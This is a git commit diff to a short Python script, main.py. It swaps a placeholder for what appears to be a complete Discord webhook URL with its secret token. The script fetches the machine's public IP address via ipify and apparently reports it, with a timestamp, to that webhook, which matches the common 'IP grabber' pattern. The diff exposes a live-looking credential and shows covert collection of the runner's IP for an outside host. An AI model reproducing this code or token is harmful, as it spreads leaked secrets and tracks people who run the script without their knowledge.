2e76d00b23c33e5fd699c6dc91ed47184ef9de47
userR7789 <148051972+userR7789@users.noreply.github.com>
2023-10-16 15:07:51 +0200

    Update main.py

--- main.py
+++ main.py
@@ -3,7 +3,7 @@ import json
 from dhooks import Webhook, Embed
 from datetime import datetime
 
-hook = Webhook("webhook-url-here")
+hook = Webhook("https://discord.com/api/webhooks/1163398290377818123/Jympfp2bfuvSLw5KorwjdhTx6y03HvougLwCjgup2mdsX695TnTR3rqhTX34aYSEMpOt")
 
 time = datetime.now().strftime("%H:%M %p")  
 ip = requests.get('https://api.ipify.org/').text
